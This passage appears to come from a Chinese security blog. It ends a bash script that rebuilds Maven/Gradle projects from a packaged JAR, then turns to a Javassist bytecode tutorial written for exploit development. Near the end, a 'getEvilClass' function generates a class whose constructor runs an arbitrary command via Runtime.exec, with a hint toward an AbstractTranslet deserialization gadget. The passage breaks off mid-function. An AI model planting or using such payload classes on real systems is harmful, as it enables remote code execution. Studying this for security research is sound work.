class="line">        <span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;$&#123;g&#125;&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;$&#123;a&#125;&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;$&#123;v&#125;&lt;/version&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span> &lt; <span class="string">&quot;<span class="variable">$&#123;TMP_GAV_U&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line">EOF</span><br><span class="line">  write_build_plugins <span class="string">&quot;<span class="variable">$&#123;PACKAGING&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&lt;/project&gt;</span><br><span class="line">EOF</span><br><span class="line">&#125; &gt; <span class="string">&quot;<span class="variable">$&#123;POM_AUTO&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 pom.offline.xml（全部 systemPath）</span></span><br><span class="line">ok <span class="string">&quot;Generate <span class="variable">$&#123;POM_OFF&#125;</span> (ALL systemPath)&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line"><span class="string">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line"><span class="string">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span></span><br><span class="line"><span class="string">  &lt;groupId&gt;$&#123;GROUP_ID&#125;&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">  &lt;artifactId&gt;$&#123;ARTIFACT_ID&#125;&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">  &lt;version&gt;$&#123;VERSION&#125;&lt;/version&gt;</span></span><br><span class="line"><span class="string">  &lt;packaging&gt;$&#123;PACKAGING&#125;&lt;/packaging&gt;</span></span><br><span class="line"><span class="string">  &lt;properties&gt;</span></span><br><span class="line"><span class="string">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span></span><br><span class="line"><span class="string">    &lt;maven.compiler.release&gt;$&#123;JAVA_RELEASE&#125;&lt;/maven.compiler.release&gt;</span></span><br><span class="line"><span class="string">  &lt;/properties&gt;</span></span><br><span class="line"><span class="string">  &lt;dependencies&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;LIB&#125;</span>/&quot;</span>*.jar; <span class="keyword">do</span></span><br><span class="line">    [[ -e <span class="string">&quot;<span class="variable">$j</span>&quot;</span> ]] || <span class="built_in">continue</span></span><br><span class="line">    base=<span class="string">&quot;<span class="subst">$(basename <span class="string">&quot;<span class="variable">$j</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    <span class="comment"># 从去重后的 TSV 找坐标</span></span><br><span class="line">    line=<span class="string">&quot;<span class="subst">$(grep -F $&#x27;\t&#x27;<span class="string">&quot;<span class="variable">$&#123;base&#125;</span>&quot;</span>$&#x27;\t&#x27; <span class="string">&quot;<span class="variable">$&#123;TMP_GAV_U&#125;</span>&quot;</span> || true)</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [[ -z <span class="string">&quot;<span class="variable">$line</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="comment"># 直接猜</span></span><br><span class="line">      name=<span class="string">&quot;<span class="variable">$&#123;base%.jar&#125;</span>&quot;</span>; v=<span class="string">&quot;<span class="variable">$&#123;name##*-&#125;</span>&quot;</span>; a=<span class="string">&quot;<span class="variable">$&#123;name%-<span class="variable">$&#123;v&#125;</span>&#125;</span>&quot;</span></span><br><span class="line">      [[ -z <span class="string">&quot;<span class="variable">$a</span>&quot;</span> || <span class="string">&quot;<span class="variable">$a</span>&quot;</span> == <span class="string">&quot;<span class="variable">$name</span>&quot;</span> ]] &amp;&amp; &#123; a=<span class="string">&quot;<span class="variable">$name</span>&quot;</span>; v=<span class="string">&quot;1.0&quot;</span>; &#125;</span><br><span class="line">      g=<span class="string">&quot;local.libs&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment"># 重新定位该 jar 的 GAV</span></span><br><span class="line">      g=<span class="string">&quot;<span class="subst">$(awk -F&#x27;\t&#x27; -v b=<span class="string">&quot;<span class="variable">$base</span>&quot;</span> &#x27;$1 ~ b &#123;print $2; exit&#125;&#x27; <span class="string">&quot;<span class="variable">$&#123;TMP_GAV_U&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">      a=<span class="string">&quot;<span class="subst">$(awk -F&#x27;\t&#x27; -v b=<span class="string">&quot;<span class="variable">$base</span>&quot;</span> &#x27;$1 ~ b &#123;print $3; exit&#125;&#x27; <span class="string">&quot;<span class="variable">$&#123;TMP_GAV_U&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">      v=<span class="string">&quot;<span class="subst">$(awk -F&#x27;\t&#x27; -v b=<span class="string">&quot;<span class="variable">$base</span>&quot;</span> &#x27;$1 ~ b &#123;print $4; exit&#125;&#x27; <span class="string">&quot;<span class="variable">$&#123;TMP_GAV_U&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">      [[ -z <span class="string">&quot;<span class="variable">$g</span>&quot;</span> ]] &amp;&amp; g=<span class="string">&quot;local.libs&quot;</span></span><br><span class="line">      <span class="keyword">if</span> [[ -z <span class="string">&quot;<span class="variable">$a</span>&quot;</span> || -z <span class="string">&quot;<span class="variable">$v</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        name=<span class="string">&quot;<span class="variable">$&#123;base%.jar&#125;</span>&quot;</span>; v2=<span class="string">&quot;<span class="variable">$&#123;name##*-&#125;</span>&quot;</span>; a2=<span class="string">&quot;<span class="variable">$&#123;name%-<span class="variable">$&#123;v2&#125;</span>&#125;</span>&quot;</span></span><br><span class="line">        [[ -z <span class="string">&quot;<span class="variable">$a2</span>&quot;</span> || <span class="string">&quot;<span class="variable">$a2</span>&quot;</span> == <span class="string">&quot;<span class="variable">$name</span>&quot;</span> ]] &amp;&amp; &#123; a2=<span class="string">&quot;<span class="variable">$name</span>&quot;</span>; v2=<span class="string">&quot;1.0&quot;</span>; &#125;</span><br><span class="line">        [[ -z <span class="string">&quot;<span class="variable">$a</span>&quot;</span> ]] &amp;&amp; a=<span class="string">&quot;<span class="variable">$a2</span>&quot;</span>; [[ -z <span class="string">&quot;<span class="variable">$v</span>&quot;</span> ]] &amp;&amp; v=<span class="string">&quot;<span class="variable">$v2</span>&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;$&#123;g&#125;&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;$&#123;a&#125;&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;$&#123;v&#125;&lt;/version&gt;</span></span><br><span class="line"><span class="string">      &lt;scope&gt;system&lt;/scope&gt;</span></span><br><span class="line"><span class="string">      &lt;systemPath&gt;\$&#123;project.basedir&#125;/lib/$&#123;base&#125;&lt;/systemPath&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># WAR 注入 provided</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;PACKAGING&#125;</span>&quot;</span> == <span class="string">&quot;war&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">      &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;javax.servlet.jsp-api&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.3.1&lt;/version&gt;</span><br><span class="line">      &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">EOF</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line">EOF</span><br><span class="line">  write_build_plugins <span class="string">&quot;<span class="variable">$&#123;PACKAGING&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&lt;/project&gt;</span><br><span class="line">EOF</span><br><span class="line">&#125; &gt; <span class="string">&quot;<span class="variable">$&#123;POM_OFF&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主 POM 落地：prefer-embedded =&gt; 用原生；auto =&gt; 用 pom.auto.xml</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;USE_EMBED_AS_MAIN&#125;</span>&quot;</span> == <span class="string">&quot;true&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  ok <span class="string">&quot;Use embedded POM as project/pom.xml (per POM_MODE=prefer-embedded)&quot;</span></span><br><span class="line">  <span class="built_in">cp</span> -f <span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/pom.original.xml&quot;</span> <span class="string">&quot;<span class="variable">$&#123;POM_MAIN&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  ok <span class="string">&quot;Use auto POM as project/pom.xml (per POM_MODE=<span class="variable">$&#123;POM_MODE&#125;</span>)&quot;</span></span><br><span class="line">  <span class="built_in">cp</span> -f <span class="string">&quot;<span class="variable">$&#123;POM_AUTO&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;POM_MAIN&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 可选 Gradle 离线 ======</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;GEN_GRADLE_OFFLINE&#125;</span>&quot;</span> == <span class="string">&quot;true&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  ok <span class="string">&quot;Generate Gradle offline files&quot;</span></span><br><span class="line">  <span class="built_in">cat</span> &gt; <span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/settings.gradle&quot;</span> &lt;&lt;<span class="string">&#x27;SG&#x27;</span></span><br><span class="line">rootProject.name = <span class="string">&#x27;app-recovered&#x27;</span></span><br><span class="line">SG</span><br><span class="line">  <span class="built_in">cat</span> &gt; <span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/build.gradle.offline&quot;</span> &lt;&lt;<span class="string">&#x27;BG&#x27;</span></span><br><span class="line">plugins &#123; <span class="built_in">id</span> <span class="string">&#x27;java&#x27;</span> &#125;</span><br><span class="line">repositories &#123; mavenCentral() &#125;</span><br><span class="line">dependencies &#123; implementation fileTree(<span class="built_in">dir</span>: <span class="string">&#x27;lib&#x27;</span>, include: [<span class="string">&#x27;*.jar&#x27;</span>]) &#125;</span><br><span class="line">java &#123; toolchain &#123; languageVersion = JavaLanguageVersion.of(8) &#125; &#125;</span><br><span class="line">BG</span><br><span class="line">  sed -i.bak <span class="string">&quot;s/LanguageVersion.of(8)/LanguageVersion.of(<span class="variable">$&#123;JAVA_RELEASE&#125;</span>)/g&quot;</span> <span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/build.gradle.offline&quot;</span> 2&gt;/dev/null || <span class="literal">true</span></span><br><span class="line">  [[ <span class="string">&quot;<span class="variable">$&#123;PACKAGING&#125;</span>&quot;</span> == <span class="string">&quot;war&quot;</span> ]] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;apply plugin: &#x27;war&#x27;&quot;</span> &gt;&gt; <span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/build.gradle.offline&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== README ======</span></span><br><span class="line"><span class="built_in">cat</span> &gt; <span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/README-restore.md&quot;</span> &lt;&lt;<span class="string">&#x27;MD&#x27;</span></span><br><span class="line"><span class="comment"># Restore Notes</span></span><br><span class="line"></span><br><span class="line">- 源码：`src/main/java`（如下载了 `cfr.jar` 且未禁用反编译）</span><br><span class="line">- 资源：`src/main/resources`（Spring Boot 的 `templates/`、`static/`、`public/`、`META-INF/resources/` 已映射）</span><br><span class="line">- WAR：静态/JSP =&gt; `src/main/webapp`；`WEB-INF` 下除 `classes/lib` 外的配置也已复制</span><br><span class="line">- 依赖：</span><br><span class="line">  - `pom.xml`           —— 主 POM（按 POM_MODE：原生或 auto）</span><br><span class="line">  - `pom.auto.xml`      —— 在线友好：能识别坐标的写标准 `&lt;dependency&gt;`；命中 `SYSTEMIZE_PREFIXES` 或无坐标的写 `systemPath`</span><br><span class="line">  - `pom.offline.xml`   —— 完全离线：`lib/` 里所有 JAR 以 `systemPath` 挂载</span><br><span class="line">  - （可选）`build.gradle.offline` —— 全离线构建（`fileTree(<span class="string">&#x27;lib&#x27;</span>)`）</span><br><span class="line"></span><br><span class="line"><span class="comment">## 构建</span></span><br><span class="line">- 在线/私服（优先原生 POM）：`mvn -q -DskipTests package`</span><br><span class="line">- 使用自动 POM：`mvn -q -DskipTests -f pom.auto.xml package`</span><br><span class="line">- 完全离线：`mvn -q -DskipTests -f pom.offline.xml package`</span><br><span class="line"></span><br><span class="line"><span class="comment">## 运行（Spring Boot）</span></span><br><span class="line">- `mvn spring-boot:run` 或 `java -jar target/*.jar`</span><br><span class="line">MD</span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 总结 ======</span></span><br><span class="line">ok <span class="string">&quot;DONE.&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  Packaging: <span class="subst">$([[ <span class="string">&quot;<span class="variable">$&#123;IS_WAR&#125;</span>&quot;</span> == <span class="string">&quot;true&quot;</span> ]] &amp;&amp; echo WAR || ( [[ <span class="string">&quot;<span class="variable">$&#123;IS_BOOT&#125;</span>&quot;</span> == <span class="string">&quot;true&quot;</span> ]] &amp;&amp; echo SpringBoot || echo JAR )</span>)&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  Project:   <span class="variable">$&#123;PROJ&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  POMs:      pom.xml (main), pom.auto.xml, pom.offline.xml&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>









<h1 id="Java-字节码"><a href="#Java-字节码" class="headerlink" title="Java 字节码"></a>Java 字节码</h1><h2 id="字节码动态生成"><a href="#字节码动态生成" class="headerlink" title="字节码动态生成"></a>字节码动态生成</h2><p>在编写 exp 的时候会涉及恶意类的字节码，为了方便动态修改参数通常我们会选择动态生成字节码，而不是分别编译恶意类和 exp。</p>
<p>Javassist 是一个开源的字节码操作库，能够在运行时对 Java 类的字节码进行修改。如果你使用 Maven 作为构建工具，可以在 <code>pom.xml</code> 文件中添加以下依赖来引入 Javassist：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.29.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>Javassist 封装了复杂的字节码操作，使得开发者可以通过更简单的 API 进行字节码生成、修改、方法插桩等操作。不过这里我们主要用到的就是 Javassist 的字节码生成功能。</p>
<h3 id="获取-ClassPool-实例"><a href="#获取-ClassPool-实例" class="headerlink" title="获取 ClassPool 实例"></a>获取 <code>ClassPool</code> 实例</h3><p><code>ClassPool</code> 是一个类池，它用于存储已经加载或创建的类的字节码。通过 <code>ClassPool</code>，你可以创建新的类，修改现有类，或者从池中获取已加载的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取默认的 ClassPool 实例</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>ClassPool.getDefault()</code> 方法返回一个全局的 <code>ClassPool</code> 实例，这是最常用的获取方式。<code>ClassPool</code> 默认会使用一些常见的类路径进行初始化。</li>
<li><code>ClassPool</code> 本质上是一个类字节码的存储池，所有的类都会保存在这里。</li>
</ul>
<h3 id="创建一个新的类"><a href="#创建一个新的类" class="headerlink" title="创建一个新的类"></a>创建一个新的类</h3><p>通过 <code>ClassPool</code> 创建一个新的类，可以使用 <code>makeClass</code> 方法，这个方法会返回一个 <code>CtClass</code> 对象，表示一个新的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个新的类，名为 &quot;HelloWorld&quot;</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;HelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><code>CtClass</code> 是 <code>Javassist</code> 中表示类的对象，可以将其看作是 Java 类的抽象表示。你可以通过 <code>CtClass</code> 操作类的字段、方法、构造器等。</p>
<h3 id="向类中添加属性"><a href="#向类中添加属性" class="headerlink" title="向类中添加属性"></a>向类中添加属性</h3><h4 id="创建字段"><a href="#创建字段" class="headerlink" title="创建字段"></a>创建字段</h4><p>你可以为新创建的类添加字段（属性）。字段的类型、名称以及访问修饰符都可以在创建时指定。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个公共的 String 类型的字段 &quot;message&quot;</span></span><br><span class="line"><span class="type">CtField</span> <span class="variable">field</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(pool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;message&quot;</span>, ctClass);</span><br><span class="line">field.setModifiers(Modifier.PUBLIC); <span class="comment">// 设置字段为公共字段</span></span><br><span class="line">ctClass.addField(field); <span class="comment">// 将字段添加到类中</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>CtField</code> 表示类中的一个字段。构造方法需要指定字段的类型、字段名和所属的类。</li>
<li><code>Modifier.PUBLIC</code>：用于指定字段的访问修饰符，可以是 <code>public</code>、<code>private</code>、<code>protected</code> 等。</li>
<li><code>addField()</code>：将创建的字段添加到类中。</li>
</ul>
<h4 id="创建方法"><a href="#创建方法" class="headerlink" title="创建方法"></a>创建方法</h4><p>你可以使用 <code>CtMethod</code> 类来表示方法，并通过 <code>CtMethod.make()</code> 或直接调用构造方法来创建方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个公共的无参数方法 sayHello，打印 message 字段的值</span></span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> CtMethod.make(</span><br><span class="line">    <span class="string">&quot;public void sayHello() &#123; System.out.println(message); &#125;&quot;</span>, ctClass);</span><br><span class="line">ctClass.addMethod(method); <span class="comment">// 将方法添加到类中</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>CtMethod.make()</code> 用于从源代码字符串创建一个方法。你可以将方法的代码（作为字符串）传递给 <code>make()</code> 方法。</li>
<li><code>addMethod()</code>：将方法添加到类中。</li>
</ul>
<p>当然也可以定义一个带参数的 <code>sayHello(String name)</code>，其中字符串里就是完整的 Java 方法源码，Javassist 会帮你编译。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> CtMethod.make(</span><br><span class="line">    <span class="string">&quot;public void sayHello(String name) &#123; System.out.println(message + \&quot;, \&quot; + name); &#125;&quot;</span>, </span><br><span class="line">    ctClass);</span><br><span class="line">ctClass.addMethod(method);</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>CtMethod.make(&quot;源码字符串&quot;, ctClass)</code> 只能用来<strong>生成方法</strong>。它内部会把你写的源码解析成一个 <code>CtMethod</code> 对象，然后挂到 <code>ctClass</code> 上。也就是说，它只适合 <strong>普通方法</strong>（有参 &#x2F; 无参、静态 &#x2F; 实例方法都可以）。</p>

    </div>
  </div>

<p>如果你想动态指定参数类型，不用写源码字符串，可以这么写：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义方法签名：返回类型 void，方法名 sayHello，参数类型 String</span></span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(</span><br><span class="line">    CtClass.voidType,               <span class="comment">// 返回类型</span></span><br><span class="line">    <span class="string">&quot;sayHello&quot;</span>,                     <span class="comment">// 方法名</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;pool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;, <span class="comment">// 参数类型数组</span></span><br><span class="line">    ctClass                         <span class="comment">// 所属类</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置方法体</span></span><br><span class="line">method.setBody(<span class="string">&quot;&#123; System.out.println(message + \&quot;, \&quot; + $1); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加到类中</span></span><br><span class="line">ctClass.addMethod(method);</span><br></pre></td></tr></table></figure></div>

<p>这里有几个关键点：</p>
<ul>
<li><code>CtClass.voidType</code> 表示返回类型是 <code>void</code>。</li>
<li><code>new CtClass[]&#123;...&#125;</code> 里放方法参数类型，可以多个，比如 <code>String</code>、<code>int</code> 等。</li>
<li>方法体里的 <code>$1</code> 表示<strong>第一个参数</strong>（类似 <code>$2</code> 表示第二个参数）。</li>
</ul>
<h4 id="创建构造方法"><a href="#创建构造方法" class="headerlink" title="创建构造方法"></a>创建构造方法</h4><p>为了初始化类的字段，通常会创建一个构造方法。<code>Javassist</code> 提供了 <code>CtConstructor</code> 类用于构造方法的生成。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个带参数的构造方法，接受一个 String 类型的参数并赋值给 message 字段</span></span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;pool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);</span><br><span class="line">constructor.setBody(<span class="string">&quot;&#123; this.message = $1; &#125;&quot;</span>); <span class="comment">// 设置构造方法的实现</span></span><br><span class="line">ctClass.addConstructor(constructor); <span class="comment">// 将构造方法添加到类中</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>CtConstructor</code>：表示类中的一个构造方法。构造方法的参数类型通过 <code>CtClass</code> 数组传递，方法体通过 <code>setBody()</code> 设置。</p>
</li>
<li><p><code>$1</code>：表示构造方法的第一个参数（在 <code>setBody()</code> 中的 <code>$1</code> 对应构造方法传入的参数。另外普通函数直接源码构建，不需要这么写）。</p>
</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>因为在字节码规范里，<strong>构造方法 <code>&lt;init&gt;</code></strong> 和普通方法是不一样的，所以 <code>CtMethod.make(&quot;...源码...&quot;, ctClass)</code> 只能解析普通方法。构造函数必须用 <code>CtConstructor</code> 创建，不能像方法一样直接用源码字符串。</p>
<p>虽然没有 <code>CtConstructor.make(...)</code>，但 <code>CtConstructor.setBody(&quot;{ ... }&quot;)</code> 的参数就是一段源码字符串（方法体），所以写法上也很接近。</p>

    </div>
  </div>

<h3 id="生成字节码"><a href="#生成字节码" class="headerlink" title="生成字节码"></a>生成字节码</h3><p>现在我们已经定义好了类的字段、方法和构造方法，接下来需要生成类的字节码。<code>CtClass</code> 提供了 <code>toBytecode()</code> 方法，来将类转化为字节码。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] bytecode = ctClass.toBytecode();</span><br></pre></td></tr></table></figure></div>

<p>例如我们可以实现一个 <code>getEvilClass</code> 函数来动态生成恶意类的字节码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">    constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">    ctClass.addConstructor(constructor);</span><br><span class="line">    </span><br><span class="line">    ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置父类为 AbstractTranslet</span></span><br><span class="line">    <span class="comment">// CtClass superC = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span></span><br><span class="line">    